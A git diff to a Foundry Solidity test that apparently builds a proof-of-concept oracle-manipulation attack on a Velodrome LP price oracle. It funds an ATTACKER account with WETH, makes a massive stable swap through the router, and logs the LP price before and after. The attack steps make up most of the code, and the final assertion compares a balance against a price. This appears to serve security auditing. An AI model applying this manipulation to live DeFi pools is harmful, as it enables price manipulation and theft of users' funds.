@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/VerodromeOracle.sol";
+import "forge-std/console2.sol";
 
 interface IRouter {
     struct route {
@@ -54,7 +55,7 @@ contract VeloOracleTest is Test {
         // Attack Pattern
         // 1. Check initial Price
         uint256 initialPrice = oracle.get_lp_price(STABLE_PAIR,prices);
-
+        console2.log("initialPrice: ", initialPrice);
         // 2. Check a reserve
         // Trick, just get balance of LP token, since it's so manipulated yet
         uint256 initialBalanceOfWETH = WETH.balanceOf(STABLE_PAIR);
@@ -63,9 +64,30 @@ contract VeloOracleTest is Test {
 
         // 3. Do a Massive Swap
         deal(address(WETH), address(ATTACKER), initialBalanceOfWETH); // Assign a specified amount of WETH tokens (`intialBalanceOfWETH` to the ATTACKER account.)
-        WETH.approve(STABLE_PAIR, initialBalanceOfWETH); // Authorizing the `STABLE_PAIR` contract to transfer up to an `initialBalanceOfWETH` amount of WETH tokens from the `ATTACKER` account.
+        WETH.approve(address(VELO_ROUTER), initialBalanceOfWETH); // Authorizing the `STABLE_PAIR` contract to transfer up to an `initialBalanceOfWETH` amount of WETH tokens from the `ATTACKER` account.
 
+        /**
+        struct route {
+            address from;
+            address to;
+            bool stable;
+        }
+        */
+        IRouter.route[] memory r = new IRouter.route[](1);
+        IRouter.route memory the_route = IRouter.route({
+            from: address(WETH),
+            to: address(WSTETH),
+            stable: true
+        });
+
+        r[0] = the_route;
+        VELO_ROUTER.swapExactTokensForTokens(initialBalanceOfWETH, 1, r, address(ATTACKER), block.timestamp);
 
         // 4. Verify if Price Changes
+        uint256 newPrice =  oracle.get_lp_price(STABLE_PAIR,prices);
+        console2.log("newPrice: ", newPrice);
+        assertEq(initialBalanceOfWETH, newPrice, "Different");
+
+
     }
 }
